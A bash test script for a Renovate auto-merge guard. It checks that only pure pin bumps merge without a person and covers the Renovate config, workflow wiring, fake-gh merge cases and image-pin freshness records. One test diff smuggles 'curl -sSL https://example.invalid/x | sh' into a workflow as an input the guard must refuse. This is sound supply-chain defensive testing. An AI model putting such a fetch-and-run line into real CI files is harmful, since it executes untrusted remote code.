#!/usr/bin/env bash
#
# The pins that Renovate moves: a Renovate pull request merges with no person
# only when it moves pins and nothing else, and no major version; a pin that
# Renovate does not move is reported.
#
# Part 1 runs the diff check of scripts/merge-bot-pr (--check-diff) on diffs
# that it must pass and diffs that it must refuse.
#   exit 0 pins only, 3 more than pins, 4 nothing changed, 5 a major version
#
# Part 2 reads .github/renovate.json and the pins of the tree:
#   - no rule merges a major update with no person
#   - platformAutomerge is false (bot-merge.yml does the merge)
#   - the regex manager matches each image pin of Dockerfile,
#     .github/workflows and scripts, with the tag of its marker
#
# Part 3 reads the wiring with yq: bot-merge.yml starts on the workflow named
# by ci.yml, only for renovate/ branches of this repository, and whatever the
# conclusion of the run.
#
# Part 4 runs scripts/merge-bot-pr against a stand-in for gh
# (tests/fixtures/issues/fake-gh). It merges only when the required check
# passed on the head commit. A fork pull request with the same branch name
# does not stop it.
#
# Part 5 runs scripts/check-image-pins --seen in a fixture tree against a
# stand-in for curl (tests/fixtures/89-bot-merge-guard/fake-curl): the days
# behind count from the first run that saw the pin behind.
#
# Part 6 runs the step of freshness.yml that reads the record of Part 5: it
# reads only an artifact of a run on the default branch of this repository.
set -euo pipefail
# shellcheck source-path=SCRIPTDIR/..
# shellcheck source=lib/harness.sh
. "$REPO_ROOT/tests/lib/harness.sh"

GUARD="$REPO_ROOT/scripts/merge-bot-pr"
CONFIG="$REPO_ROOT/.github/renovate.json"
FIX="$(fixture_dir)"

work="$(work_dir)"
trap 'rm -rf "$work"' EXIT

#---------------------------------------------------------------------------#
# Part 1: the diff check.
#---------------------------------------------------------------------------#
# expect NAME WANT DESC: the exit status of the check on $work/NAME.diff
expect() {
  local got=0
  bash "$GUARD" --check-diff "$work/$1.diff" > "$work/$1.out" 2>&1 || got=$?
  if [ "$got" = "$2" ]; then
    ok "$3 (exit $got)"
  else
    fail "$3" \
      "the check exited $got, expected $2" \
      "it said: $(awk 'NF' "$work/$1.out" | tr '\n' ' ' | cut -c1-300)" \
      "reproduce: scripts/merge-bot-pr --check-diff <the diff in tests/static/89-bot-merge-guard.sh, case $1>"
  fi
}

# diff_of NAME FILE OLD NEW: a one-line diff of FILE from OLD to NEW
diff_of() {
  {
    printf 'diff --git a/%s b/%s\n--- a/%s\n+++ b/%s\n@@ -1,1 +1,1 @@\n' "$2" "$2" "$2" "$2"
    printf -- '-%s\n+%s\n' "$3" "$4"
  } > "$work/$1.diff"
}

old_sha=53b7df96c91f9c12dcc8a07bcb9ccacbed38856a
new_sha=c3c9e263c25d99ce0380d002d59b67737d91b0dc
old_dig=b860afd5823683f7ea389ba5f00d812f4fe55f6f286dea329d2abeefa535e309
new_dig=4e77cf2ea5f410e6f8be5abf93ccf17ce2436e87a138c167208356711a405dbd
wf=.github/workflows/build-deploy.yml

diff_of action "$wf" "        uses: docker/build-push-action@$old_sha # v7.3.0" \
  "        uses: docker/build-push-action@$new_sha # v7.4.0"
expect action 0 "an action moved to a new commit, with a minor version comment, passes"

diff_of digest Dockerfile "ARG BASE_IMAGE=docker.io/library/archlinux:latest@sha256:$old_dig" \
  "ARG BASE_IMAGE=docker.io/library/archlinux:latest@sha256:$new_dig"
expect digest 0 "the base image moved to a new digest passes"

diff_of script scripts/binfmt-register "IMAGE=docker.io/tonistiigi/binfmt:qemu-v10.0.4@sha256:$old_dig" \
  "IMAGE=docker.io/tonistiigi/binfmt:qemu-v10.1.0@sha256:$new_dig"
expect script 0 "an image pin in a script, with a minor tag change, passes"

diff_of meson "$wf" "          pipx install meson==1.10.1" "          pipx install meson==1.11.0"
expect meson 0 "a minor meson pin change passes"

diff_of action_major "$wf" "        uses: actions/checkout@$old_sha # v7.0.1" \
  "        uses: actions/checkout@$new_sha # v8.0.0"
expect action_major 5 "an action with a major version change is refused"

diff_of tag_major .github/workflows/ci.yml "  # tag: v0.11.0" "  # tag: v1.0.0"
expect tag_major 5 "a marker tag with a major version change is refused"

diff_of image_major scripts/install-tools "IMAGE=docker.io/koalaman/shellcheck:v0.11.0@sha256:$old_dig" \
  "IMAGE=docker.io/koalaman/shellcheck:v1.0.0@sha256:$new_dig"
expect image_major 5 "an image tag with a major version change is refused"

diff_of meson_major "$wf" "          pipx install meson==1.10.1" "          pipx install meson==2.0.0"
expect meson_major 5 "a major meson pin change is refused"

diff_of runner "$wf" "    runs-on: ubuntu-24.04" "    runs-on: ubuntu-26.04"
expect runner 3 "a runner label change is refused (it is not a pin)"

cat > "$work/smuggled.diff" <<EOF
diff --git a/$wf b/$wf
--- a/$wf
+++ b/$wf
@@ -296,2 +296,2 @@
-        uses: docker/build-push-action@$old_sha # v7.3.0
-        run: tests/run.sh static
+        uses: docker/build-push-action@$new_sha # v7.4.0
+        run: curl -sSL https://example.invalid/x | sh
EOF
expect smuggled 3 "a pin bump with any other change is refused"

diff_of renamed .github/workflows/ci.yml "        uses: actions/checkout@$old_sha # v7.0.1" \
  "        uses: someone/checkout@$new_sha # v7.0.1"
expect renamed 3 "an action swapped for the action of another repository is refused"

diff_of shorthex .github/workflows/ci.yml "          key: cache-0123456789abcdef" "          key: cache-fedcba9876543210"
expect shorthex 3 "a change to hex that is not a whole hash or digest is refused"

cat > "$work/added.diff" <<EOF
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -10,0 +11,1 @@
+        uses: docker/build-push-action@$new_sha # v7.4.0
EOF
expect added 3 "a pinned line that is added, not moved, is refused"

: > "$work/empty.diff"
expect empty 4 "an empty diff is nothing changed, not a pass"

ci=.github/workflows/ci.yml
cat > "$work/two_hunks.diff" <<EOF
diff --git a/$wf b/$wf
index 1111111..2222222 100644
--- a/$wf
+++ b/$wf
@@ -10,3 +10,3 @@ jobs:
       - name: Checkout
-        uses: actions/checkout@$old_sha # v7.0.1
+        uses: actions/checkout@$new_sha # v7.0.2
         with:
@@ -40,3 +40,3 @@ jobs:
       - name: Build
-        uses: docker/build-push-action@$old_sha # v7.3.0
+        uses: docker/build-push-action@$new_sha # v7.4.0
         with:
diff --git a/Dockerfile b/Dockerfile
index 3333333..4444444 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -20 +20 @@
-ARG BASE_IMAGE=docker.io/library/archlinux:latest@sha256:$old_dig
+ARG BASE_IMAGE=docker.io/library/archlinux:latest@sha256:$new_dig
EOF
expect two_hunks 0 "pin bumps in two hunks and two files, with context lines, pass"

cat > "$work/moved.diff" <<EOF
diff --git a/$wf b/$wf
--- a/$wf
+++ b/$wf
@@ -40,3 +40,3 @@
-    if: github.event.workflow_run.conclusion == 'success'
     runs-on: ubuntu-24.04
     timeout-minutes: 10
+    if: github.event.workflow_run.conclusion == 'success'
EOF
expect moved 3 "a line moved down inside one hunk is refused"

cat > "$work/moved_far.diff" <<EOF
diff --git a/$wf b/$wf
--- a/$wf
+++ b/$wf
@@ -40,2 +40,1 @@
       - name: Checkout
-        with:
@@ -90,1 +89,2 @@
       - name: Build
+        with:
EOF
expect moved_far 3 "a line moved from one hunk to another is refused"

cat > "$work/dashes.diff" <<EOF
diff --git a/$wf b/$wf
--- a/$wf
+++ b/$wf
@@ -1,2 +1,2 @@
-        uses: actions/checkout@$old_sha # v7.0.1
--- persist-credentials: false
+        uses: actions/checkout@$new_sha # v7.0.2
+++ persist-credentials: true
EOF
expect dashes 3 "a changed line that starts with -- or ++ is read as a changed line, not as a header"

cat > "$work/binary.diff" <<EOF
$(cat "$work/action.diff")
diff --git a/scripts/merge-bot-pr b/scripts/merge-bot-pr
index 5555555..6666666 100755
Binary files a/scripts/merge-bot-pr and b/scripts/merge-bot-pr differ
EOF
expect binary 3 "a pin bump with a file that git shows as binary is refused"

cat > "$work/mode.diff" <<EOF
$(cat "$work/action.diff")
diff --git a/scripts/ports b/scripts/ports
old mode 100755
new mode 100644
EOF
expect mode 3 "a pin bump with a mode change is refused"

cat > "$work/rename.diff" <<EOF
$(cat "$work/action.diff")
diff --git a/scripts/ports b/scripts/ports-old
similarity index 100%
rename from scripts/ports
rename to scripts/ports-old
EOF
expect rename 3 "a pin bump with a rename is refused"

cat > "$work/newfile.diff" <<EOF
diff --git a/scripts/extra b/scripts/extra
new file mode 100755
index 0000000..7777777
--- /dev/null
+++ b/scripts/extra
@@ -0,0 +1 @@
+IMAGE=docker.io/library/busybox:latest@sha256:$new_dig
EOF
expect newfile 3 "a new file is refused"

diff_of outside README.md "uses: actions/checkout@$old_sha # v7.0.1" "uses: actions/checkout@$new_sha # v7.0.2"
expect outside 3 "a pin bump in a file that a pin bump may not change is refused"

cat > "$work/nonewline.diff" <<EOF
diff --git a/Dockerfile b/Dockerfile
--- a/Dockerfile
+++ b/Dockerfile
@@ -20 +20 @@
-ARG BASE_IMAGE=docker.io/library/archlinux:latest@sha256:$old_dig
\\ No newline at end of file
+ARG BASE_IMAGE=docker.io/library/archlinux:latest@sha256:$new_dig
\\ No newline at end of file
EOF
expect nonewline 0 "a pin bump on a last line with no newline passes"

cat > "$work/short.diff" <<EOF
diff --git a/$ci b/$ci
--- a/$ci
+++ b/$ci
@@ -1,2 +1,2 @@
-        uses: actions/checkout@$old_sha # v7.0.1
+        uses: actions/checkout@$new_sha # v7.0.2
EOF
expect short 3 "a hunk with fewer lines than its header is refused"

if need_tool git; then
  # A diff that git writes: a pin bump at two places of a workflow.
  repo="$work/gitdiff"
  mkdir -p "$repo/.github/workflows"
  {
    printf 'jobs:\n  a:\n    steps:\n'
    printf '      - uses: actions/checkout@%s # v7.0.1\n' "$old_sha"
    for n in 1 2 3 4 5 6 7 8 9 10; do printf '      - run: echo %s\n' "$n"; done
    printf '      - uses: actions/checkout@%s # v7.0.1\n' "$old_sha"
  } > "$repo/.github/workflows/x.yml"
  gd() { git -C "$repo" -c user.name=t -c user.email=t@t.invalid -c commit.gpgsign=false "$@"; }
  gd init -q
  gd add -A
  gd commit -q -m base
  sed -i "s/$old_sha # v7.0.1/$new_sha # v7.0.2/" "$repo/.github/workflows/x.yml"
  gd diff > "$work/git.diff"
  expect git 0 "a pin bump at two places, as git diff writes it, passes"
fi

#---------------------------------------------------------------------------#
# Part 2: .github/renovate.json and the pins of the tree.
#---------------------------------------------------------------------------#
if need_tool jq python3; then
  if out="$(jq -e . "$CONFIG" 2>&1 > /dev/null)"; then
    ok ".github/renovate.json is JSON"
  else
    fail ".github/renovate.json is JSON" "$out" "reproduce: jq . .github/renovate.json"
  fi

  majors="$(jq -r '.packageRules // [] | to_entries[] | select(.value.automerge == true)
    | select((.value.matchUpdateTypes // ["(all)"]) | any(. == "major" or . == "(all)")) | "packageRules[\(.key)]"' "$CONFIG")"
  top="$(jq -r '.automerge // false' "$CONFIG")"
  if [ -z "$majors" ] && [ "$top" != true ]; then
    ok "no rule of renovate.json merges a major update with no person"
  else
    fail "no rule of renovate.json merges a major update with no person" \
      "rules: ${majors:-none}; top level automerge: $top" \
      "reproduce: jq '.automerge, .packageRules' .github/renovate.json"
  fi

  pa="$(jq -r '.platformAutomerge' "$CONFIG")"
  if [ "$pa" = false ]; then
    ok "platformAutomerge is false: bot-merge.yml merges, after its own diff check"
  else
    fail "platformAutomerge is false" "it is $pa" "reproduce: jq .platformAutomerge .github/renovate.json"
  fi

  # Each image pin of the tree, matched by the regex manager as Renovate reads
  # it. The JavaScript named groups (?<n>...) are Python (?P<n>...).
  python3 -I - "$REPO_ROOT" "$CONFIG" > "$work/pins.txt" <<'PY'
import json, os, re, sys
root, config = sys.argv[1], sys.argv[2]
cfg = json.load(open(config))
pin = re.compile(r'([a-z0-9][a-z0-9._/-]*?)(?::([A-Za-z0-9._-]+))?@(sha256:[0-9a-f]{64})')
files = []
for d in ('', '.github/workflows', 'scripts'):
    base = os.path.join(root, d)
    for name in sorted(os.listdir(base)):
        rel = os.path.join(d, name) if d else name
        if os.path.isfile(os.path.join(root, rel)) and (d or name == 'Dockerfile'):
            files.append(rel)
managers = [m for m in cfg.get('customManagers', []) if m.get('datasourceTemplate') == 'docker']
for rel in files:
    text = open(os.path.join(root, rel), encoding='utf-8', errors='replace').read()
    # Keyed by the offset of the digest, so two pins of one digest are two pins.
    found = {m.start(3): m for m in pin.finditer(text)}
    if not found:
        continue
    matched = {}
    for m in managers:
        pats = [re.compile(p.strip('/')) for p in m.get('managerFilePatterns', [])]
        if not any(p.search(rel) for p in pats):
            continue
        for s in m.get('matchStrings', []):
            for hit in re.finditer(s.replace('(?<', '(?P<'), text):
                matched[hit.start('currentDigest')] = hit.group('currentValue')
    for at, m in sorted(found.items()):
        line = text.count('\n', 0, at) + 1
        inline = m.group(2)
        if at not in matched:
            print('UNMATCHED %s:%d %s' % (rel, line, m.group(0)[:80]))
        elif inline and matched[at] != inline:
            print('MISTAGGED %s:%d marker %s, pin %s' % (rel, line, matched[at], inline))
        else:
            print('ok %s:%d %s' % (rel, line, matched[at]))
PY
  bad="$(awk '$1 != "ok"' "$work/pins.txt")"
  n="$(awk 'END { print NR + 0 }' "$work/pins.txt")"
  if [ "$n" -eq 0 ]; then
    fail "the tree has image pins for Renovate to move" \
      "no name@sha256:<64 hex> in Dockerfile, .github/workflows or scripts" \
      "reproduce: grep -rnE '@sha256:[0-9a-f]{64}' Dockerfile .github/workflows scripts"
  elif [ -z "$bad" ]; then
    ok "the regex manager of renovate.json matches each of the $n image pins, with the tag of its marker"
  else
    fail "the regex manager of renovate.json matches each image pin, with the tag of its marker" \
      "$(printf '%s' "$bad" | tr '\n' ';')" \
      "a pin that Renovate does not match never moves" \
      "reproduce: put '# tag: <tag>' at most 3 lines above the pin; scripts/check-image-pins"
  fi
fi

#---------------------------------------------------------------------------#
# Part 3: the wiring.
#---------------------------------------------------------------------------#

if need_tool yq jq; then
  yaml_json "$REPO_ROOT/.github/workflows/bot-merge.yml" > "$work/bot.json"
  yaml_json "$REPO_ROOT/.github/workflows/ci.yml" > "$work/ci.json"
  ci_name="$(jq -r '.name // empty' "$work/ci.json")"
  # A YAML 1.1 reader reads the key "on" as true.
  listens="$(jq -r '(.on // .["true"]).workflow_run.workflows // [] | .[]' "$work/bot.json")"
  if [ -n "$ci_name" ] && printf '%s\n' "$listens" | awk -v n="$ci_name" '$0 == n { f = 1 } END { exit !f }'; then
    ok "bot-merge.yml starts when the workflow '$ci_name' (ci.yml) completes"
  else
    fail "bot-merge.yml starts when the workflow named by ci.yml completes" \
      "ci.yml name: '${ci_name:-none}'; bot-merge.yml workflow_run.workflows: $(printf '%s' "$listens" | tr '\n' ' ')" \
      "when the two differ, no Renovate pull request merges" \
      "reproduce: yq '.name' .github/workflows/ci.yml; yq '.on.workflow_run' .github/workflows/bot-merge.yml"
  fi
  cond="$(jq -r '.jobs.merge.if // empty' "$work/bot.json")"
  case "$cond" in
    *"startsWith(github.event.workflow_run.head_branch, 'renovate/')"*)
      case "$cond" in
        *"github.event.workflow_run.head_repository.full_name == github.repository"*)
          ok "bot-merge.yml runs only for a renovate/ branch of this repository"
          ;;
        *)
          fail "bot-merge.yml runs only for a branch of this repository" "jobs.merge.if: $cond" \
            "reproduce: yq '.jobs.merge.if' .github/workflows/bot-merge.yml"
          ;;
      esac
      ;;
    *)
      fail "bot-merge.yml runs only for a renovate/ branch" "jobs.merge.if: ${cond:-none}" \
        "reproduce: yq '.jobs.merge.if' .github/workflows/bot-merge.yml"
      ;;
  esac
  # ⛔ The conclusion of the run includes jobs that the required check does
  # not need. A condition on it stops each merge when such a job fails.
  case "$cond" in
    *"workflow_run.conclusion"*)
      fail "bot-merge.yml starts whatever the conclusion of the CI run; the script reads the required check" \
        "jobs.merge.if: $cond" \
        "a failed network job makes the run conclude failure while the required check passes" \
        "reproduce: yq '.jobs.merge.if' .github/workflows/bot-merge.yml"
      ;;
    *) ok "bot-merge.yml starts whatever the conclusion of the CI run; the script reads the required check" ;;
  esac
  runs_guard="$(jq -r '[.jobs.merge.steps[]?.run // empty | select(test("scripts/merge-bot-pr"))] | length' "$work/bot.json")"
  checks="$(jq -r '.jobs.merge.permissions.checks // "none"' "$work/bot.json")"
  check_eq "bot-merge.yml runs scripts/merge-bot-pr, with checks: read" "1 read" "$runs_guard $checks" \
    "yq '.jobs.merge' .github/workflows/bot-merge.yml"
fi

#---------------------------------------------------------------------------#
# Part 4: scripts/merge-bot-pr against a stand-in for gh.
#---------------------------------------------------------------------------#
if need_tool jq; then
  mkdir -p "$work/bin"
  cp "$REPO_ROOT/tests/fixtures/issues/fake-gh" "$work/bin/gh"
  chmod +x "$work/bin/gh"
  head_sha=1234567890abcdef1234567890abcdef12345678
  n_gh=0
  # pr_case [PR_JSON ...]: a fresh FAKE_GH_DIR with these open pull requests
  # (default: the Renovate pull request #12) and the diff of #12. Sets gh.
  renovate_pr="$(jq -nc --arg s "$head_sha" '{number: 12, headRefName: "renovate/x", headRefOid: $s,
    author: {login: "app/renovate", is_bot: true}, isCrossRepository: false, isDraft: false,
    baseRefName: "main", labels: [], files: [{path: ".github/workflows/build-deploy.yml"}]}')"
  pr_case() {
    n_gh=$((n_gh + 1))
    gh="$work/gh-$n_gh"
    mkdir -p "$gh"
    : > "$gh/calls.log"
    if [ "$#" -eq 0 ]; then
      set -- "$renovate_pr"
    fi
    printf '%s\n' "$@" | jq -s . > "$gh/prs.json"
    cp "$work/action.diff" "$gh/diff-12.diff"
  }
  # check_runs RUN...: the check runs of the head commit. RUN is
  # ID:NAME:STATUS:CONCLUSION[:APP].
  check_runs() {
    local r id name st co app
    for r in "$@"; do
      IFS=: read -r id name st co app <<< "$r"
      jq -nc --argjson id "$id" --arg n "$name" --arg s "$st" --arg c "$co" --arg a "${app:-github-actions}" \
        '{id: $id, name: $n, status: $s, conclusion: (if $c == "-" then null else $c end), app: {slug: $a}}'
    done | jq -s '{total_count: length, check_runs: .}' > "$gh/check-runs-$head_sha.json"
  }
  # merge_bot: run scripts/merge-bot-pr on renovate/x at head_sha; prints
  # "<exit> <events>"
  merge_bot() {
    local rc=0
    PATH="$work/bin:$PATH" FAKE_GH_DIR="$gh" GH_TOKEN=stub GITHUB_REPOSITORY=test/repo DEFAULT_BRANCH=main \
      "$GUARD" renovate/x "$head_sha" > "$work/merge.out" 2>&1 || rc=$?
    printf '%s %s\n' "$rc" "$(tr '\n' ';' < "$gh/calls.log" | sed 's/;$//')"
  }
  REQ="Static suite and linters"
  M="FAKE_GH_DIR=DIR scripts/merge-bot-pr renovate/x $head_sha"
  merged="0 approve 12;merge 12 $head_sha"

  pr_case
  check_runs "5:$REQ:completed:success" "6:Network suite:completed:failure"
  check_eq "merge-bot-pr: the required check passed and the network job failed: merged" "$merged" "$(merge_bot)" "$M"
  pr_case
  check_runs "5:$REQ:completed:failure"
  check_eq "merge-bot-pr: the required check failed: left alone" "0 " "$(merge_bot)" "$M"
  pr_case
  check_runs "5:$REQ:in_progress:-"
  check_eq "merge-bot-pr: the required check did not end: left alone" "0 " "$(merge_bot)" "$M"
  pr_case
  check_runs "6:Network suite:completed:success"
  check_eq "merge-bot-pr: no required check on the head commit: left alone" "0 " "$(merge_bot)" "$M"
  pr_case
  check_runs "5:$REQ:completed:success:someone-else"
  check_eq "merge-bot-pr: a check with the required name from another app: left alone" "0 " "$(merge_bot)" "$M"
  pr_case
  check_runs "5:$REQ:completed:success" "8:$REQ:completed:failure"
  check_eq "merge-bot-pr: the newest run of the required check failed: left alone" "0 " "$(merge_bot)" "$M"
  pr_case "$(jq -nc '{number: 30, headRefName: "renovate/x", headRefOid: "f00", author: {login: "mallory"},
    isCrossRepository: true, isDraft: false, baseRefName: "main", labels: [], files: []}')" "$renovate_pr"
  check_runs "5:$REQ:completed:success"
  check_eq "merge-bot-pr: a fork pull request with the same branch name does not stop the merge" \
    "$merged" "$(merge_bot)" "$M"
  pr_case "$(printf '%s' "$renovate_pr" | jq -c '.headRefOid = "0000000000000000000000000000000000000000"')"
  check_runs "5:$REQ:completed:success"
  check_eq "merge-bot-pr: a head that moved after the CI run: left alone" "0 " "$(merge_bot)" "$M"
fi

#---------------------------------------------------------------------------#
# Part 5: scripts/check-image-pins --seen in a fixture tree.
#---------------------------------------------------------------------------#
if need_tool jq curl sha256sum; then
  tree="$work/pins"
  mkdir -p "$tree/scripts" "$tree/.github/workflows" "$work/curlbin"
  for s in check-image-pins lib.sh date-age; do
    cp "$REPO_ROOT/scripts/$s" "$tree/scripts/$s"
  done
  cp "$FIX/fake-curl" "$work/curlbin/curl"
  chmod +x "$work/curlbin/curl"
  pinned="sha256:$old_dig"
  newer="sha256:$new_dig"
  other="sha256:$(printf '%064d' 7)"
  printf '# tag: latest\nARG BASE_IMAGE=docker.io/library/archlinux:latest@%s\n' "$pinned" > "$tree/Dockerfile"
  today="$(date -u +%Y-%m-%d)"
  seen="$work/seen.txt"
  # registry DIGEST [CODE]: the registry answers DIGEST for the tag latest,
  # with CODE (default 200), and Docker Hub says the tag was pushed today
  registry() {
    printf '%s\t%s\t%s\t%s\n' \
      "https://registry-1.docker.io/v2/" 200 - - \
      "https://registry-1.docker.io/v2/library/archlinux/manifests/latest" "${2:-200}" - "$1" \
      "https://hub.docker.com/v2/namespaces/library/repositories/archlinux/tags/latest" 200 \
      "{\"tag_last_pushed\": \"${today}T01:00:00Z\"}" - > "$work/routes"
  }
  # pins ARGS...: run the copy; prints "<exit> <each record line, ; between>"
  pins() {
    local rc=0
    env -u GITHUB_OUTPUT PATH="$work/curlbin:$PATH" FAKE_CURL_ROUTES="$work/routes" HTTP_TRIES=1 \
      "$tree/scripts/check-image-pins" "$@" > "$work/pins.out" 2>&1 || rc=$?
    printf '%s %s\n' "$rc" "$(if [ -f "$seen" ]; then awk '!/^#/' "$seen" | tr '\n' ';' | sed 's/;$//'; fi)"
  }
  P5="scripts/check-image-pins --max-age 14 --seen FILE, with a fake curl (tests/static/89-bot-merge-guard.sh)"
  line="Dockerfile docker.io/library/archlinux:latest $pinned"

  registry "$newer"
  rm -f "$seen"
  check_eq "check-image-pins --seen: a pin behind for the first time is not overdue, and its first day is today" \
    "0 $today $line" "$(pins --max-age 14 --seen "$seen")" "$P5"

  printf '2026-01-01 %s\n' "$line" > "$seen"
  check_eq "check-image-pins --seen: a pin seen behind since long ago is overdue, though its tag moved today" \
    "3 2026-01-01 $line" "$(pins --max-age 14 --seen "$seen")" "$P5"

  printf '2026-01-01 Dockerfile docker.io/library/archlinux:latest %s\n' "$other" > "$seen"
  check_eq "check-image-pins --seen: the record of another pinned digest does not count" \
    "0 $today $line" "$(pins --max-age 14 --seen "$seen")" "$P5"

  registry "$pinned"
  printf '2026-01-01 %s\n' "$line" > "$seen"
  check_eq "check-image-pins --seen: a pin that is current leaves the record" \
    "0 " "$(pins --max-age 14 --seen "$seen")" "$P5"

  registry "$newer" 404
  printf '2026-01-01 %s\n' "$line" > "$seen"
  check_eq "check-image-pins --seen: a pin whose tag is not read keeps its line, and the check fails" \
    "1 2026-01-01 $line" "$(pins --max-age 14 --seen "$seen")" "$P5"

  registry "$newer"
  printf 'not a record line\n2026-01-01 %s\n' "$line" > "$seen"
  check_eq "check-image-pins --seen: a line that is not a record line is left out" \
    "3 2026-01-01 $line" "$(pins --max-age 14 --seen "$seen")" "$P5"

  rm -f "$seen"
  check_eq "check-image-pins with no --seen: the age is the age of the new digest" \
    "0 " "$(pins --max-age 14)" "$P5"
fi

#---------------------------------------------------------------------------#
# Part 6: the step of freshness.yml that reads the record.
#---------------------------------------------------------------------------#
if need_tool yq jq timeout; then
  FRESH="$REPO_ROOT/.github/workflows/freshness.yml"
  yaml_json "$FRESH" > "$work/fresh.json"
  jq -r '.jobs["image-pins"].steps[]? | select(.id == "seen") | .run // empty' "$work/fresh.json" > "$work/seen-step.sh"
  RS="yq '.jobs[\"image-pins\"].steps[] | select(.id == \"seen\") | .run' .github/workflows/freshness.yml"
  if [ ! -s "$work/seen-step.sh" ]; then
    fail "freshness.yml job image-pins has a step with id seen that reads the record" "no such step" "reproduce: $RS"
  else
    # artifact ID RUN DAYS_AGO HEAD_REPO_ID BRANCH EXPIRED: one entry of the
    # artifact list; the repository id is 7
    artifact() {
      jq -nc --argjson id "$1" --argjson run "$2" --arg t "2026-10-${3}T04:45:00Z" --argjson h "$4" --arg b "$5" \
        --argjson e "$6" '{id: $id, name: "image-pins-seen", expired: $e, created_at: $t,
          workflow_run: {id: $run, repository_id: 7, head_repository_id: $h, head_branch: $b}}'
    }
    # step ARTIFACT...: run the step; prints the record it read, or "none"
    step() {
      local rc=0 a rt="$work/rt-step"
      gh="$work/gh-step"
      rm -rf "$gh" "$rt"
      mkdir -p "$gh" "$rt"
      : > "$gh/calls.log"
      for a in 101 102 103 104; do
        mkdir -p "$gh/artifacts/$a/image-pins-seen"
        printf 'the record of run %s\n' "$a" > "$gh/artifacts/$a/image-pins-seen/image-pins-seen.txt"
      done
      printf '%s\n' "$@" | jq -s '{total_count: length, artifacts: .}' > "$gh/artifacts.json"
      PATH="$work/bin:$PATH" FAKE_GH_DIR="$gh" GH_TOKEN=stub GITHUB_REPOSITORY=test/repo \
        RUNNER_TEMP="$rt" bash --noprofile --norc -eo pipefail "$work/seen-step.sh" \
        > "$work/step.out" 2>&1 || rc=$?
      if [ "$rc" -ne 0 ]; then
        printf 'exit %s: %s\n' "$rc" "$(tr '\n' ' ' < "$work/step.out" | cut -c1-200)"
      elif [ -f "$rt/seen/image-pins-seen.txt" ]; then
        cat "$rt/seen/image-pins-seen.txt"
      else
        echo none
      fi
    }
    check_eq "freshness.yml reads the newest record of the default branch, not of a fork, another branch or an expired one" \
      "the record of run 101" \
      "$(step "$(artifact 1 101 05 7 main false)" "$(artifact 2 102 10 99 main false)" \
        "$(artifact 3 103 12 7 other false)" "$(artifact 4 104 14 7 main true)")" "$RS"
    check_eq "freshness.yml with no record to read goes on with none" "none" \
      "$(step "$(artifact 2 102 10 99 main false)")" "$RS"
  fi
  seen_arg="$(jq -r '.jobs["image-pins"].steps[]? | select(.id == "pins") | .run // empty' "$work/fresh.json" \
    | awk '{ if (match($0, /--seen "[^"]*"/)) print substr($0, RSTART + 8, RLENGTH - 9) }')"
  kept="$(jq -r '.jobs["image-pins"].steps[]? | select((.uses // "") | startswith("actions/upload-artifact@"))
    | select(.with.name == "image-pins-seen") | .with.path' "$work/fresh.json" | sed 's/\${{ *runner.temp *}}/$RUNNER_TEMP/')"
  check_eq "freshness.yml keeps the record that check-image-pins --seen writes, as the artifact image-pins-seen" \
    "$seen_arg" "${kept:-none}" "yq '.jobs[\"image-pins\"].steps' .github/workflows/freshness.yml"
fi

summary
